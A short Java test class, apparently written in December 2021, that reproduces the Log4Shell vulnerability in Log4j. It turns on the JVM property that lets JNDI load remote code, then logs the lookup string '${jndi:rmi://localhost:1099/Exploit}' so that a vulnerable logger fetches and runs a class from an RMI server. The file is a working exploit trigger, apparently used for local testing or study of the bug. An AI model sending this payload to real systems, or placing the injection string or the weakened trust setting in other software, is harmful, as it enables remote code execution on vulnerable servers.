package log4j.bug;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * RMI测试通过
 *
 * @author renhuibo
 * @date 2021/12/14 16:04
 */
public class RMITest {
  private static final Logger logger = LogManager.getLogger(RMITest.class);

  public static void main(String[] args) {
    System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
    logger.error("${jndi:rmi://localhost:1099/Exploit}");
    try {
      Thread.sleep(1000);
    } catch (Exception e) {
    }
  }
}
